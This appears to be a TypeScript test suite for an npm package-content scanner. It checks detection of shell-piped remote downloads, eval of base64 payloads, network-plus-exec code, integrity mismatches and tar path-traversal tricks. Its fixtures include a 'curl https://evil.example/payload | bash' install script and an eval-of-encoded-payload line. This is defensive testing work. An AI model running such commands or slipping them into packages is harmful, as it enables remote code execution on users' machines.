import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { describe, it } from 'node:test';
import { gunzipSync, gzipSync } from 'node:zlib';

import { analyzePackageTarball } from '../src/scanner/package-content.js';
import { Severity } from '../src/scanner/types.js';

interface TestEntry {
  readonly path: string;
  readonly content: string | Buffer;
  readonly type?: string;
  readonly linkPath?: string;
}

function writeTarString(target: Buffer, value: string, offset: number, length: number): void {
  target.write(value, offset, Math.min(length, Buffer.byteLength(value)), 'utf8');
}

function writeTarOctal(target: Buffer, value: number, offset: number, length: number): void {
  const encoded = `${value.toString(8).padStart(length - 1, '0')}\0`;
  target.write(encoded, offset, length, 'ascii');
}

function makeTarball(entries: readonly TestEntry[]): Buffer {
  const blocks: Buffer[] = [];
  for (const entry of entries) {
    const data = typeof entry.content === 'string' ? Buffer.from(entry.content) : entry.content;
    const header = Buffer.alloc(512);
    writeTarString(header, entry.path, 0, 100);
    writeTarOctal(header, 0o644, 100, 8);
    writeTarOctal(header, 0, 108, 8);
    writeTarOctal(header, 0, 116, 8);
    writeTarOctal(header, data.length, 124, 12);
    writeTarOctal(header, 0, 136, 12);
    header.fill(0x20, 148, 156);
    header[156] = (entry.type ?? '0').charCodeAt(0);
    if (entry.linkPath) writeTarString(header, entry.linkPath, 157, 100);
    writeTarString(header, 'ustar\0', 257, 6);
    writeTarString(header, '00', 263, 2);
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(`${checksum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'ascii');
    blocks.push(header, data);
    const padding = (512 - (data.length % 512)) % 512;
    if (padding > 0) blocks.push(Buffer.alloc(padding));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function integrity(archive: Buffer): string {
  return `sha512-${createHash('sha512').update(archive).digest('base64')}`;
}

describe('package-content deep scanner', () => {
  it('verifies and scans a clean tarball entirely in memory', () => {
    const archive = makeTarball([
      { path: 'package/index.js', content: 'export const answer = 42;\n' },
      { path: 'package/logo.png', content: Buffer.from([1, 2, 3]) },
    ]);
    const result = analyzePackageTarball(archive, { integrity: integrity(archive) });

    assert.strictEqual(result.summary.status, 'complete');
    assert.strictEqual(result.summary.integrityVerified, true);
    assert.strictEqual(result.summary.filesScanned, 1);
    assert.strictEqual(result.summary.filesSkipped, 1);
    assert.deepStrictEqual(result.findings, []);
  });

  it('reports remote content piped to a shell as critical', () => {
    const archive = makeTarball([{
      path: 'package/scripts/install.sh',
      content: '#!/bin/sh\ncurl https://evil.example/payload | bash\n',
    }]);
    const result = analyzePackageTarball(archive);
    const finding = result.findings.find((entry) => entry.ruleId === 'content-remote-shell');

    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Critical);
    assert.strictEqual(finding.filePath, 'package/scripts/install.sh');
    assert.strictEqual(finding.lineNumber, 2);
  });

  it('detects encoded payloads combined with dynamic execution', () => {
    const payload = 'A'.repeat(200);
    const archive = makeTarball([{
      path: 'package/index.js',
      content: `const payload = "${payload}";\neval(Buffer.from(payload, "base64").toString());\n`,
    }]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) =>
      entry.ruleId === 'content-obfuscated-exec' && entry.severity === Severity.High));
  });

  it('detects files that combine networking and process execution', () => {
    const archive = makeTarball([{
      path: 'package/install.js',
      content: 'const { exec } = require("child_process");\nfetch("https://example.test/tool");\nexec("tool");\n',
    }]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-network-exec'));
  });

  it('refuses an archive whose bytes do not match published integrity', () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const result = analyzePackageTarball(archive, { integrity: 'sha512-AAAAAAAA' });

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((entry) =>
      entry.ruleId === 'content-integrity-mismatch' && entry.severity === Severity.Critical));
  });

  it('accepts any matching digest from the strongest SRI algorithm', () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const valid = createHash('sha512').update(archive).digest('base64');
    const result = analyzePackageTarball(archive, {
      integrity: `sha512-AAAAAAAA sha512-${valid}`,
    });

    assert.strictEqual(result.summary.integrityVerified, true);
    assert.strictEqual(result.summary.status, 'complete');
  });

  it('flags path traversal without writing archive entries to disk', () => {
    const archive = makeTarball([{ path: '../outside.js', content: 'console.log("x")' }]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-path'));
  });

  it('flags an escaping PAX link target', () => {
    const archive = makeTarball([
      { path: 'pax-header', type: 'x', content: '24 linkpath=../../outside\n' },
      { path: 'package/link', type: '2', content: '' },
    ]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-link'));
  });

  it('treats non-zero data after the tar terminator as an invalid archive', () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const tar = gunzipSync(archive);
    tar[tar.length - 1] = 1;
    const result = analyzePackageTarball(gzipSync(tar));

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-invalid'));
  });

  it('does not mistake an ordinary RegExp exec call for child-process execution', () => {
    const archive = makeTarball([{
      path: 'package/index.js',
      content: 'const match = /hello/.exec(input);\n',
    }]);
    const result = analyzePackageTarball(archive);

    assert.ok(!result.findings.some((entry) => entry.ruleId === 'content-process-exec'));
  });

  it('marks the scan partial when configured text limits are reached', () => {
    const archive = makeTarball([{
      path: 'package/large.js',
      content: 'x'.repeat(256),
    }]);
    const result = analyzePackageTarball(archive, { maxFileBytes: 64 });

    assert.strictEqual(result.summary.status, 'partial');
    assert.strictEqual(result.summary.truncated, true);
    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-scan-incomplete'));
  });

  it('reports native executable content once per archive', () => {
    const archive = makeTarball([
      { path: 'package/prebuilds/a.node', content: Buffer.from([0, 1, 2]) },
      { path: 'package/prebuilds/b.node', content: Buffer.from([0, 1, 2]) },
    ]);
    const result = analyzePackageTarball(archive);

    assert.strictEqual(result.findings.filter((entry) => entry.ruleId === 'content-native-binary').length, 1);
  });
});
